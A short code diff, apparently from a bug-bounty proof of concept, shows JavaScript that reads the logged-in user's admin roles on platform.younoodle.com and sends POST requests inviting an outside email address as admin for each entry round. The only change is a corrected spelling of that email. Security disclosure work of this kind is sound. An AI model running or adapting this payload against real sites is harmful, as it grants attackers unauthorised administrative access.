@@ -24,7 +24,7 @@ fetch('https://platform.younoodle.com/api/current-user/roles')
         if (data.admin && data.admin.length > 0) {
             data.admin.forEach(id => {
                 const postData = {
-                    email: 'hack3dby0mar@wearehackerone.com'
+                    email: 'hack3db0mar@wearehackerone.com'
                 };
                 const inviteUrl = `https://platform.younoodle.com/api/entry-rounds/${id}/admins/invite`;
                 // Sending POST request
